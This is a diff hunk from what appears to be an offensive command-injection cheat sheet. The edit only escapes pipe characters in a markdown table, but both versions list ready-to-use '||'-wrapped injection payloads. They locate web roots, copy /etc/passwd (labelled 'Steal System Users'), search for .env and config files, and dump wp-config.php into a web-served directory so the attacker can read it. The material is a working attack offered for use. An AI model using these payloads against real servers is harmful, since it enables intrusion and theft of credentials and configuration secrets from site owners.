@@ -68,12 +68,12 @@ If the Shotgun fails, find the homepage location instantly:
 
 | Goal | Payload (Replace `[ROOT]` with your found path) |
 | :--- | :--- |
-| **Test 3 Defaults** | `|| (ls -la /var/www/html/ > /var/www/html/A.txt; ls -la /var/www/ > /var/www/B.txt; ls -la /usr/local/apache2/htdocs/ > /usr/local/apache2/htdocs/C.txt) ||` |
-| **Find Homepage** | `|| find / -name "index.php" 2>/dev/null | head -1 > [ROOT]/home.txt ||` |
-| **Steal System Users** | `|| cat /etc/passwd > [ROOT]/users.txt ||` |
-| **Find All Configs** | `|| find / -name "*.env" -o -name "*.conf" -o -name "config.*" 2>/dev/null > [ROOT]/env.txt ||` |
-| **Read a Config File** | `|| cat /var/www/html/wp-config.php > [ROOT]/wp.txt ||` |
-| **List Directory Contents** | `|| ls -la /home/ > [ROOT]/home_dir.txt ||` |
+| **Test 3 Defaults** | `\|\| (ls -la /var/www/html/ > /var/www/html/A.txt; ls -la /var/www/ > /var/www/B.txt; ls -la /usr/local/apache2/htdocs/ > /usr/local/apache2/htdocs/C.txt) \|\|` |
+| **Find Homepage** | `\|\| find / -name "index.php" 2>/dev/null \| head -1 > [ROOT]/home.txt \|\|` |
+| **Steal System Users** | `\|\| cat /etc/passwd > [ROOT]/users.txt \|\|` |
+| **Find All Configs** | `\|\| find / -name "*.env" -o -name "*.conf" -o -name "config.*" 2>/dev/null > [ROOT]/env.txt \|\|` |
+| **Read a Config File** | `\|\| cat /var/www/html/wp-config.php > [ROOT]/wp.txt \|\|` |
+| **List Directory Contents** | `\|\| ls -la /home/ > [ROOT]/home_dir.txt \|\|` |
 
 ---
 
